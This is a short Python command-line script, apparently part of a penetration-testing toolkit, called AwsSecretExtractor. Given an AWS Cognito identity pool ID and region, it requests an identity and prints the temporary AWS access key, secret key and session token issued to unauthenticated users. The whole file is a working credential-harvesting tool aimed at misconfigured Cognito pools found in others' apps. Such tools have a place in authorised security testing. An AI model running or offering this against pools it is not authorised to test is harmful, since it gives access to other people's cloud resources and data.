#!/bin/python3
import boto3
import argparse
from pprint import pprint
from colorama import Fore
from core.ascii import cli

class AwsSecretExtractor:
    def __init__(self, identity_pool,region_name):
        """
        Args:
            identity_pool[str]: AWS Cognito Pool ID
            region_name[str]: AWS Region Name
        """
        self.pool = identity_pool
        self.region = region_name
        self.cred = self.get_pool_credentials()
    
    def get_pool_credentials(self):
        """
        Fetch the AWS key, Secrets and Token Using AWS Pool ID.
        Returns:
            [dict]: Returns the data about AWS Secrets.
        """
        client = boto3.client('cognito-identity', region_name=self.region)
        try:
            _id = client.get_id(IdentityPoolId=self.pool)
            _id = _id['IdentityId']
            credentials = client.get_credentials_for_identity(IdentityId=_id)
            access_key = credentials['Credentials']['AccessKeyId']
            secret_key = credentials['Credentials']['SecretKey']
            session_token = credentials['Credentials']['SessionToken']
            identity_id = credentials['IdentityId']
            return {"Access-Key":access_key, "Secret-Key":secret_key, "Session-Token":session_token}
        except client.exceptions.NotAuthorizedException as e:
            return ("error: {}".format(e))

    
if __name__ == "__main__":
    print(cli())
    argparse = argparse.ArgumentParser()
    argparse.add_argument("-p", "--pool", help="aws pool ID to fetch the secrets")
    argparse.add_argument("-r", "--region", help="aws region name to fetch the secrets")
    args = argparse.parse_args()


    if args.pool:
        secrets = AwsSecretExtractor(args.pool,args.region)
        print(Fore.BLUE + "[!] Extracting Aws Secrets ..... \n")
        print(Fore.RED)
        pprint(secrets.get_pool_credentials())
